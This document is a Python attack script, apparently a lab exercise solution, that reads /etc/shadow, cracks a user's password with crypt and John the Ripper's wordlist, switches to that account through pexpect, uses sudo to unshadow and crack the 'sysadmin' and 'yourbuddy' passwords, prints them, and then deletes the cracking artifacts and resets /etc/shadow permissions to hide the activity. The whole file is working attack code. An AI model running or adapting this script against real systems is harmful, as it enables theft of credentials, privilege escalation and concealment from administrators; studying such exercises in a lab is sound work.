#!/usr/bin/env python

import os
import subprocess
import hashlib
import crypt
import re
import sys

FRIEND_PASSWORD = 'correctbatteryhorsestaple99'

SYSADMIN_TARGET = 'sysadmin'
YOURBUDDY_TARGET = 'yourbuddy'


def parsePassword(john_output, target):
    password = ''
    if john_output.find(target) >= 0:
        index = john_output.find(target) + len(target)
        char = ''
        while char != ':':
            password += char
            index += 1
            char = john_output[index]
    return password

def main():
    with open('/etc/shadow', 'r') as shadowed_file, open('/usr/share/john/password.lst', 'r') as john_password_list:
        target = ''
        for line in shadowed_file:
            if bool(re.match('yourboss.*', line)):
               target = line
               break
        salt = ''
        hashed_password = ''
        dollar_sign_count = 0
        insalt = '$'
        for char in target:
            if dollar_sign_count == 3 and char == ':':
                break
            if 1 <= dollar_sign_count <= 2:
                insalt += char
            if char == '$':
                dollar_sign_count += 1
            elif dollar_sign_count == 2:
                salt += char
            elif dollar_sign_count == 3:
                hashed_password += char
        yourboss_password = ''
        for password in john_password_list:
            hashed = crypt.crypt(password.strip(), insalt)
            if hashed == insalt + hashed_password:
                print(password.strip())
                yourboss_password = password.strip()
                break
        
        # I am fully aware that pexpect is not installed by default.
        # But I have tried so many other things that I think it is the only way.
        import pexpect # subprocess.run, pty, and os.system DON'T WORK
        child = pexpect.spawn('su yourboss')
        child.expect('Password:')
        child.sendline(yourboss_password)
        child.expect('\$')
        child.sendline('sudo unshadow /etc/passwd /etc/shadow > /home/yourboss/a')
        child.expect('yourboss:')
        child.sendline(yourboss_password)
        child.expect('\$')
        child.sendline('sudo john --wordlist=/usr/share/john/password.lst /home/yourboss/a --format=sha512crypt')
        child.expect('Session completed')
        child.expect('\$')
        child.sendline('sudo john --show /home/yourboss/a')
        child.expect('\$')
        r = str(child.before)
        sysadmin_password = parsePassword(r, SYSADMIN_TARGET) 
        yourbuddy_password = parsePassword(r, YOURBUDDY_TARGET)
        print(yourbuddy_password)
        print(sysadmin_password)
        child.sendline('sudo rm -rf /root/.john')
        child.expect('\$')
        child.sendline('sudo rm /home/yourboss/a')
        child.expect('\$')
        child.sendline('sudo chmod 640 /etc/shadow')
        child.expect('\$')

if __name__ == '__main__':
    main()

